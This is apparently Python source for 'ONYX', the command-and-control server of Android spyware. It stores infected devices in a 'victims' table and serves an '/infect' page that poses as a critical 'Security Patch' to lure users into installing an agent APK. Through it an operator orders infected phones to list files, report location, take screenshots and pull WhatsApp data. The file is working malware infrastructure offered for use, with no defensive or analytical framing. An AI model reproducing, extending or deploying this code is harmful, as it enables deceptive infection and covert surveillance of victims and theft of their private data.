#!/usr/bin/env python3
import os, json, sqlite3, logging, time
from flask import Flask, render_template_string, request, session, redirect, url_for, send_file
from flask_socketio import SocketIO, emit
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
from datetime import datetime, timezone, timedelta
from functools import wraps
from werkzeug.middleware.proxy_fix import ProxyFix

ADMIN_USER = os.environ.get('ADMIN_USER')
ADMIN_PASSWORD = os.environ.get('ADMIN_PASSWORD')
API_KEY = os.environ.get('API_KEY')
SECRET_KEY = os.environ.get('SECRET_KEY')
CORS_ORIGIN = os.environ.get('CORS_ORIGIN', 'https://onyx-production-8026.up.railway.app')

if not all([ADMIN_USER, ADMIN_PASSWORD, API_KEY, SECRET_KEY]):
    raise RuntimeError("Missing required env: ADMIN_USER, ADMIN_PASSWORD, API_KEY, SECRET_KEY")

PORT = int(os.environ.get('PORT', 5000))

logging.basicConfig(
    level=logging.INFO,
    format='{"time":"%(asctime)s","level":"%(levelname)s","message":"%(message)s"}'
)
logger = logging.getLogger(__name__)

app = Flask(__name__)
app.secret_key = SECRET_KEY
app.permanent_session_lifetime = timedelta(days=7)
app.wsgi_app = ProxyFix(app.wsgi_app, x_proto=1, x_host=1)

limiter = Limiter(key_func=get_remote_address, default_limits=["200 per day", "50 per hour"])
limiter.init_app(app)

socketio = SocketIO(app, cors_allowed_origins=CORS_ORIGIN, async_mode='threading', logger=False, engineio_logger=False)

def get_db():
    return sqlite3.connect('/tmp/onyx.db', check_same_thread=False)

with get_db() as conn:
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS victims
                 (device_id TEXT PRIMARY KEY, info TEXT, last_seen TEXT)''')
    conn.commit()

AGENTS = {}

def login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not session.get('logged_in'):
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated

@app.route('/login', methods=['GET', 'POST'])
@limiter.limit("5 per minute")
def login():
    if request.method == 'POST':
        if request.form.get('username') == ADMIN_USER and request.form.get('password') == ADMIN_PASSWORD:
            session['logged_in'] = True
            session.permanent = True
            logger.info(f"Admin login from {request.remote_addr}")
            return redirect(url_for('dashboard'))
        logger.warning(f"Failed login attempt from {request.remote_addr}")
        return "Invalid credentials", 403
    session['csrf_token'] = os.urandom(16).hex()
    return f'''
    <form method="post" style="background:#0a0a14;color:#fff;padding:40px;max-width:400px;margin:100px auto;border-radius:20px;border:1px solid #7c3aed;">
    <input type="hidden" name="csrf_token" value="{session['csrf_token']}">
    <h2>🔐 ONYX Login</h2>
    <input type="text" name="username" placeholder="Username" required style="width:100%;padding:10px;margin:10px 0;background:#222;color:#fff;border:1px solid #444;"><br>
    <input type="password" name="password" placeholder="Password" required style="width:100%;padding:10px;margin:10px 0;background:#222;color:#fff;border:1px solid #444;"><br>
    <button type="submit" style="background:#7c3aed;padding:10px 40px;border:none;border-radius:30px;color:#fff;font-weight:bold;">Enter</button>
    </form>
    '''

@app.route('/logout')
def logout():
    session.clear()
    logger.info("Admin logged out")
    return redirect(url_for('login'))

@app.route('/')
@login_required
def dashboard():
    try:
        html = open('templates/dashboard.html', 'r').read()
    except FileNotFoundError:
        html = "<h1>Dashboard missing</h1>"
    return render_template_string(html, ip=request.host_url.rstrip('/'))

@app.route('/apk')
@login_required
def apk_download():
    apk_path = 'apks/onyx_agent.apk'
    if os.path.exists(apk_path):
        return send_file(apk_path, as_attachment=True)
    return "APK not built yet", 404

@app.route('/infect')
def infect():
    logger.info(f"Infect page accessed from {request.remote_addr}")
    return '''
    <!DOCTYPE html><html><head><meta name="viewport"><title>Update</title>
    <style>body{background:#000;color:#fff;text-align:center;padding-top:50px;font-family:sans-serif;}
    .btn{background:#7c3aed;padding:15px 40px;border-radius:50px;color:#fff;font-size:20px;text-decoration:none;display:inline-block;}</style>
    </head><body><div style="background:#111;padding:40px;border-radius:20px;max-width:400px;margin:auto;border:1px solid #7c3aed;">
    <h1>⚠️ Security Patch</h1><p>Install this critical update to secure your device.</p>
    <a href="/apk" class="btn">⬇ Download & Install</a>
    <p style="font-size:12px;color:#666;">After download, tap "Install".</p></div></body></html>
    '''

@socketio.on('connect')
def handle_connect():
    logger.info(f"Socket connected: {request.sid}")

@socketio.on('register_agent')
def register_agent(data):
    if data.get('api_key') != API_KEY:
        logger.warning(f"Socket auth failed from {request.sid}")
        return
    device_id = data.get('device_id')
    if not device_id:
        return
    AGENTS[device_id] = request.sid
    with get_db() as conn:
        c = conn.cursor()
        c.execute("REPLACE INTO victims (device_id, info, last_seen) VALUES (?, ?, ?)",
                  (device_id, json.dumps(data.get('info', {})), datetime.now(timezone.utc).isoformat()))
        conn.commit()
    logger.info(f"Agent registered: {device_id}")
    emit('agent_registered', {'status': 'ok'}, room=request.sid)
    emit('victims_list', list(AGENTS.keys()), broadcast=True)

@socketio.on('agent_response')
def agent_response(data):
    emit('command_result', {
        'device_id': data.get('device_id'),
        'data': data.get('data')
    }, room=request.sid)

@socketio.on('send_cmd')
def send_cmd(data):
    device_id = data.get('id')
    cmd = data.get('cmd')
    if not device_id or device_id not in AGENTS:
        emit('command_result', {'error': 'Device offline'}, room=request.sid)
        return
    allowed = ['list_files', 'get_location', 'take_screenshot', 'pull_whatsapp']
    base_cmd = cmd.split(':')[0]
    if base_cmd not in allowed:
        logger.warning(f"Blocked command '{cmd}' from {request.sid}")
        emit('command_result', {'error': f'Command {base_cmd} not allowed'}, room=request.sid)
        return
    logger.info(f"Command '{cmd}' sent to {device_id}")
    emit('execute_command', {'cmd': cmd}, room=AGENTS[device_id])

@socketio.on('get_victims')
def get_victims():
    emit('victims_list', list(AGENTS.keys()), room=request.sid)

@socketio.on('disconnect')
def handle_disconnect():
    for device_id, sid in list(AGENTS.items()):
        if sid == request.sid:
            del AGENTS[device_id]
            with get_db() as conn:
                c = conn.cursor()
                c.execute("DELETE FROM victims WHERE device_id = ?", (device_id,))
                conn.commit()
            logger.info(f"Agent disconnected: {device_id}")
            emit('victims_list', list(AGENTS.keys()), broadcast=True)
            break

if __name__ == '__main__':
    os.makedirs('templates', exist_ok=True)
    os.makedirs('apks', exist_ok=True)
    print(f"[+] ONYX Server starting on port {PORT}")
    socketio.run(app, host='0.0.0.0', port=PORT, debug=False, allow_unsafe_wsgi=True)
